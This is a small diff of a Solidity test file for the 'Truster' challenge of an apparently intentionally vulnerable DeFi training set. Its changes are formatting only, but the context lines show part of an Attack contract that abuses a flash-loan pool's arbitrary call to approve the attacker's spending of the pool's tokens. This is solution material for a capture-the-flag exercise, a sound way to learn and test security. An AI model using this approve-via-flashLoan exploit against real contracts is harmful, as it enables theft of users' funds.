@@ -10,7 +10,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -68,7 +68,7 @@ contract TrusterChallenge is Test {
 }
 
 contract Attack {
-    constructor (address _pool, address _token, address _recovery, uint256 tokens) payable {
+    constructor(address _pool, address _token, address _recovery, uint256 tokens) payable {
         TrusterLenderPool pool = TrusterLenderPool(_pool);
         bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), tokens);
         pool.flashLoan(0, address(this), _token, data);
